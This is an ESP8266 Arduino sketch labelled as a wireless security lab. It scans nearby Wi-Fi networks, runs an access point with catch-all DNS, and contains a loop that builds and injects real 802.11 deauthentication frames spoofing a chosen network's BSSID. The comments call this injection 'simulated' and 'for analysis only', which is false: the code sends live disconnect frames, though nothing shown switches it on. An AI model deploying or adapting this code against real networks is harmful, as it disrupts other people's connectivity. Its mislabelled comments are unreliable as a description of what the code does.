/*
 * Project: Wireless Security Analysis using ESP8266
 * Author: Dhruv Patel
 *
 * Description:
 * This project demonstrates wireless network security concepts in a controlled lab environment.
 * It includes:
 * - Network scanning
 * - Simulated deauthentication testing (for analysis only)
 * - Access point behavior observation
 *
 * Note:
 * This code is strictly for educational and ethical testing purposes
 * in an authorized environment only.
 */

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}

// Structure to store network details
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

DNSServer dnsServer;
ESP8266WebServer webServer(80);

Network networks[16];
Network selectedNetwork;

bool hotspot_active = false;
bool deauthing_active = false;

// Clear stored networks
void clearArray() {
  for (int i = 0; i < 16; i++) {
    networks[i].ssid = "";
  }
}

// Scan available WiFi networks
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();

  for (int i = 0; i < n && i < 16; ++i) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].ch = WiFi.channel(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
  }
}

// Convert BSSID to string
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

// Basic web interface
void handleRoot() {
  String html = "<h2>Wireless Security Lab</h2><ul>";

  for (int i = 0; i < 16; i++) {
    if (networks[i].ssid == "") break;

    html += "<li>" + networks[i].ssid + " (" + bytesToStr(networks[i].bssid, 6) + ")</li>";
  }

  html += "</ul>";
  webServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);

  // Set device mode
  WiFi.mode(WIFI_AP_STA);

  // Create controlled test AP
  WiFi.softAP("Security_Test_Lab", "test12345");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", handleRoot);
  webServer.begin();

  performScan();
}

unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Simulated deauthentication testing (controlled environment only)
  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(selectedNetwork.ch);

    uint8_t packet[26] = {
      0xC0, 0x00, 0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0,0,0,0,0,0,
      0,0,0,0,0,0,
      0x00, 0x00, 0x01, 0x00
    };

    memcpy(&packet[10], selectedNetwork.bssid, 6);
    memcpy(&packet[16], selectedNetwork.bssid, 6);

    // Send packet (for analysis purposes)
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);

    deauth_now = millis();
  }
}
